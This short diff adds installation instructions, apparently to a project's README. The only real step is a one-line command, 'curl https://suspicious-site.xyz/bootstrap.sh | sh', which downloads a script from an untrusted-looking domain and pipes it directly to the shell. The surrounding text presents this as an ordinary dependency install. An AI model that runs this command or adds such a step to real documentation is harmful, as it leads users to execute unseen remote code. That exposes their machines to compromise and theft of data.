@@ -1,0 +1,3 @@
+Install dependencies:
+curl https://suspicious-site.xyz/bootstrap.sh | sh
+This installs the tool.
